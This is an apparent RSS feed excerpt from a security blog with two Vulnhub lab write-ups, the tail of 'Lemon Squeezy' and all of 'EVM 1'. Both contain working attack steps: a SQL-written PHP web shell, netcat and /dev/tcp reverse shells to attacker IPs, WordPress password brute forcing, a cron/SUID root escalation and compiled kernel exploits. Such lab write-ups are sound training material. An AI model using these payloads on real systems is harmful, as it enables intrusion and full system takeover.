&lt;p>After logging into wordpress with the discovered credentials &lt;strong>orange:ginger&lt;/strong>, we find another password in drafts.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-5.png" class="center" style="border-radius: 8px;" />
&lt;p>With this password, we are able to login to phpmyadmin as the orange user.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-6.png" class="center" style="border-radius: 8px;" />
&lt;p>Successful login:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-7.png" class="center" style="border-radius: 8px;" />
&lt;p>By logging in we can abuse this access by writing a file to disk that contains php by using an sql statement.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#66d9ef">into&lt;/span> outfile &lt;span style="color:#e6db74">&amp;#34;/var/www/html/wordpress/shell.php&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-8.png" class="center" style="border-radius: 8px;" />
&lt;p>We can then verify that we have successful command execution, by running the whoami command.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-9.png" class="center" style="border-radius: 8px;" />
&lt;h1 id="shell-as-www-data">Shell as www-data&lt;/h1>
&lt;p>Running the below curl command we are able to get a reverse shell:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl &lt;span style="color:#e6db74">&amp;#34;http://192.168.191.134/wordpress/shell.php?cmd=nc+-e+/bin/bash+192.168.191.1+9000+%26&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-10.png" class="center" style="border-radius: 8px;" />
&lt;p>After performing some manual local enumeration, we discover a cron job running as root.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-11.png" class="center" style="border-radius: 8px;" />
&lt;p>The script being executed in the cron job is world writeable and the www-data user can write to it.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-12.png" class="center" style="border-radius: 8px;" />
&lt;h1 id="shell-as-root">Shell as root&lt;/h1>
&lt;p>After changing the script to the below command we can create a bash binary with suid permissions.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/bash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>cp /bin/bash /suidbash
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chmod u+s /suidbash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-13.png" class="center" style="border-radius: 8px;" />
&lt;p>Once the cron is executed we get the binary and can escalate to root shell and read root.txt.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>./suidbash -p
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-14.png" class="center" style="border-radius: 8px;" />
&lt;h1 id="extras">Extras&lt;/h1>
&lt;ul>
&lt;li>It seems I forgot user.txt and it is in /var/www.&lt;/li>
&lt;/ul>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-15.png" class="center" style="border-radius: 8px;" />
&lt;ul>
&lt;li>We could write to the wordpress folder from phpmyadmin because it was world-writeable.&lt;/li>
&lt;/ul>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-16.png" class="center" style="border-radius: 8px;" /></content></item><item><title>Vulnhub: EVM 1</title><link>https://blog.ikuamike.io/posts/2021/evm/</link><pubDate>Fri, 05 Mar 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/evm/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/evm/evm.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Difficulty&lt;/th>
&lt;th>Release Date&lt;/th>
&lt;th>Author&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Beginner&lt;/td>
&lt;td>2 Nov 2019&lt;/td>
&lt;td>Ic0de&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>This was an easy box, initial foothold was on wordpress. You needed to bruteforce the admin creds
then get a reverse shell via editing a theme file to get the reverse shell. Escalating to root
was straightforward as we found the root password in a txt file. Some kernel exploits could have also
been used for privilege escalation.&lt;/p>
&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
&lt;p>Nmap&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.103
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.00028s latency&lt;span style="color:#f92672">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2048&lt;/span> a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">256&lt;/span> 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#ae81ff">256&lt;/span> 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>53/tcp open domain ISC BIND 9.10.3-P4 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| dns-nsid:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ bind.version: 9.10.3-P4-Ubuntu
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.18 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.18 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Apache2 Ubuntu Default Page: It works
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>110/tcp open pop3 Dovecot pop3d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_pop3-capabilities: CAPA RESP-CODES SASL AUTH-RESP-CODE TOP UIDL PIPELINING
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>139/tcp open netbios-ssn Samba smbd 3.X - 4.X &lt;span style="color:#f92672">(&lt;/span>workgroup: WORKGROUP&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>143/tcp open imap Dovecot imapd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_imap-capabilities: more post-login LOGINDISABLEDA0001 ID LOGIN-REFERRALS listed IMAP4rev1 have capabilities OK ENABLE Pre-login LITERAL+ SASL-IR IDLE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu &lt;span style="color:#f92672">(&lt;/span>workgroup: WORKGROUP&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host script results:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span style="color:#f92672">(&lt;/span>unknown&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb-os-discovery:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| OS: Windows 6.1 &lt;span style="color:#f92672">(&lt;/span>Samba 4.3.11-Ubuntu&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Computer name: ubuntu-extermely-vulnerable-m4ch1ine
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Domain name: &lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| FQDN: ubuntu-extermely-vulnerable-m4ch1ine
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ System time: 2021-03-04T15:43:32-05:00
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb-security-mode:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| account_used: guest
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| authentication_level: user
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| challenge_response: supported
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ message_signing: disabled &lt;span style="color:#f92672">(&lt;/span>dangerous, but default&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb2-security-mode:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 2.02:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Message signing enabled but not required
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb2-time:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| date: 2021-03-04T20:43:32
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ start_date: N/A
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
&lt;h2 id="samba-139445">Samba (139,445)&lt;/h2>
&lt;p>Running smbmap and smbclient there&amp;rsquo;s not much there.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>smbmap -R -H 192.168.56.103
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>smbclient -L &lt;span style="color:#ae81ff">\\&lt;/span>192.168.56.103 -N
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/evm/evm1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>From enum4linux-ng we only get a username&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>enum4linux-ng -A -R 192.168.56.103
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/evm/evm2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;h2 id="http-80">HTTP (80)&lt;/h2>
&lt;p>Visiting the ip on the browser there&amp;rsquo;s only the apache default page.&lt;/p>
&lt;p>Running directory bruteforce, we discover wordpress.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/evm/evm3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Wordpress:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/evm/evm4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Some of the comments hint towards bruteforcing credentials.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/evm/evm5.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Bruteforcing the login page on wordpress we get the password &lt;code>24992499&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wpscan --url http://192.168.56.103/wordpress/ -U c0rrupt3d_brain -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -t &lt;span style="color:#ae81ff">100&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/evm/evm7.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;h1 id="shell-as-www-data">Shell as www-data&lt;/h1>
&lt;p>With admin access we can edit one of the wordpress theme files to get a reverse shell with this php payload.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> &lt;span style="color:#a6e22e">exec&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span>)&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/evm/evm6.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Loading the following url we get a reverse shell.&lt;/p>
&lt;pre tabindex="0">&lt;code>http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php
&lt;/code>&lt;/pre>
&lt;img src="https://blog.ikuamike.io/img/evm/evm8.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Changing directory to /home there&amp;rsquo;s one user&amp;rsquo;s folder. Looking at all the files in this directory there&amp;rsquo;s a hidden
file with the root user&amp;rsquo;s password.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/evm/evm9.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;h1 id="shell-as-root">Shell as root&lt;/h1>
&lt;p>Using the password &lt;code>willy26&lt;/code> I switched to the root user.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/evm/evm10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;h1 id="extras">Extras&lt;/h1>
&lt;p>Privilege escalation could have also been achieved via kernel exploit.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/evm/evm11.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>The box is running ubuntu 16.04.3 and kernel version 4.4.0-87. Searching for exploits using searchsploit
we get several hits.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/evm/evm12.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Getting the first local privilege escalation script and transferring the compiled binary to the target, it works.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>searchsploit -m &lt;span style="color:#ae81ff">45010&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gcc 45010.c -o pwn
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/evm/evm13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>The second one &lt;code>44298&lt;/code> also works.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/evm/evm14.png" alt="symfonos" class="center" style="border-radius: 8px;" /></content></item></channel></rss>